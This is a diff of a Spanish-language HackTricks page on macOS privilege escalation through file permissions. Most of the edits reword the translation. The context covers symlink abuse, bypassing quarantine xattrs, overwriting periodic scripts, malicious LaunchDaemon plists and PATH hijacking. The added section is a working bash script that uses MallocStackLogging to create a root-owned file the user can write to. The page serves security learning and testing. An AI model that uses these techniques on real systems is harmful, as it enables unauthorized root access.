@@ -2,15 +2,15 @@
 
 <details>
 
-<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red Team de AWS de HackTricks)</strong></a><strong>!</strong></summary>
+<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Otras formas de apoyar a HackTricks:
 
-* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.
+* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
@@ -19,8 +19,8 @@ Otras formas de apoyar a HackTricks:
 Permisos en un **directorio**:
 
 * **lectura** - puedes **enumerar** las entradas del directorio
-* **escritura** - puedes **eliminar/escribir** **archivos** en el directorio y puedes **eliminar carpetas vacías**.&#x20;
-* Pero **no puedes eliminar/modificar carpetas no vacías** a menos que tengas permisos de escritura sobre ellas.
+* **escritura** - puedes **borrar/escribir** **archivos** en el directorio y puedes **borrar carpetas vacías**.
+* Pero **no puedes borrar/modificar carpetas no vacías** a menos que tengas permisos de escritura sobre ellas.
 * **No puedes modificar el nombre de una carpeta** a menos que la poseas.
 * **ejecución** - se te permite **atravesar** el directorio - si no tienes este derecho, no puedes acceder a ningún archivo dentro de él, ni en ningún subdirectorio.
 
@@ -36,11 +36,11 @@ Con cualquiera de las combinaciones anteriores, un atacante podría **inyectar**
 
 ### Caso Especial de R+X de la raíz de la carpeta
 
-Si hay archivos en un **directorio** donde **solo root tiene acceso de R+X**, estos **no son accesibles para nadie más**. Por lo tanto, una vulnerabilidad que permita **mover un archivo legible por un usuario**, que no se puede leer debido a esa **restricción**, desde esta carpeta **a otra diferente**, podría ser abusada para leer estos archivos.
+Si hay archivos en un **directorio** donde **solo root tiene acceso de R+X**, estos **no son accesibles para nadie más**. Por lo tanto, una vulnerabilidad que permita **mover un archivo legible por un usuario**, que no se puede leer debido a esa **restricción**, desde este directorio **a otro diferente**, podría ser abusada para leer estos archivos.
 
 Ejemplo en: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)
 
-## Enlace Simbólico / Enlace Duro
+## Enlace simbólico / Enlace duro
 
 Si un proceso privilegiado está escribiendo datos en un **archivo** que podría ser **controlado** por un **usuario menos privilegiado**, o que podría ser **creado previamente** por un usuario menos privilegiado. El usuario simplemente podría **apuntarlo a otro archivo** a través de un enlace simbólico o duro, y el proceso privilegiado escribirá en ese archivo.
 
@@ -68,7 +68,7 @@ Si puedes hacer que un **proceso abra un archivo o una carpeta con altos privile
 
 Por ejemplo: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)
 
-## Trucos para Evitar las Atributos Extendidos de Cuarentena
+## Trucos para Evitar las xattrs de Cuarentena
 
 ### Eliminarlo
 ```bash
@@ -99,7 +99,7 @@ xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
 ```
 ### ACL de writeextattr
 
-Este ACL evita agregar `xattrs` al archivo.
+Esta ACL evita agregar `xattrs` al archivo
 ```bash
 rm -rf /tmp/test*
 echo test >/tmp/test
@@ -237,13 +237,13 @@ hdiutil create -srcfolder justsome.app justsome.dmg
 
 ### Scripts sh periódicos
 
-Si tu script pudiera ser interpretado como un **script de shell**, podrías sobrescribir el script de shell **`/etc/periodic/daily/999.local`** que se activará todos los días.
+Si tu script podría ser interpretado como un **script de shell**, podrías sobrescribir el script de shell **`/etc/periodic/daily/999.local`** que se ejecutará todos los días.
 
 Puedes **simular** una ejecución de este script con: **`sudo periodic daily`**
 
-### Demonios
+### Daemons
 
-Escribe un **LaunchDaemon** arbitrario como **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** con un plist ejecutando un script arbitrario como:
+Escribe un **LaunchDaemon** arbitrario como **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** con un plist que ejecute un script arbitrario como:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -266,24 +266,38 @@ Si tienes **escritura arbitraria**, podrías crear un archivo dentro de la carpe
 
 ### Archivos PATH
 
-El archivo **`/etc/paths`** es uno de los principales lugares que populan la variable de entorno PATH. Debes ser root para sobrescribirlo, pero si un script de un **proceso privilegiado** está ejecutando algún **comando sin la ruta completa**, podrías **secuestrarlo** modificando este archivo.
+El archivo **`/etc/paths`** es uno de los lugares principales que populan la variable de entorno PATH. Debes ser root para sobrescribirlo, pero si un script de un **proceso privilegiado** está ejecutando algún **comando sin la ruta completa**, podrías **secuestrarlo** modificando este archivo.
 
-&#x20;También puedes escribir archivos en **`/etc/paths.d`** para cargar nuevas carpetas en la variable de entorno `PATH`.
+También puedes escribir archivos en **`/etc/paths.d`** para cargar nuevas carpetas en la variable de entorno `PATH`.
 
+## Generar archivos escribibles como otros usuarios
+
+Esto generará un archivo que pertenece a root y es escribible por mí ([**código desde aquí**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew\_lpe.sh)). Esto también podría funcionar como escalada de privilegios:
+```bash
+DIRNAME=/usr/local/etc/periodic/daily
+
+mkdir -p "$DIRNAME"
+chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"
+
+MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername
+
+FILENAME=$(ls "$DIRNAME")
+echo $FILENAME
+```
 ## Referencias
 
 * [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)
 
 <details>
 
-<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Aprende hacking de AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red de HackTricks de AWS)</strong></a><strong>!</strong></summary>
 
 Otras formas de apoyar a HackTricks:
 
 * Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
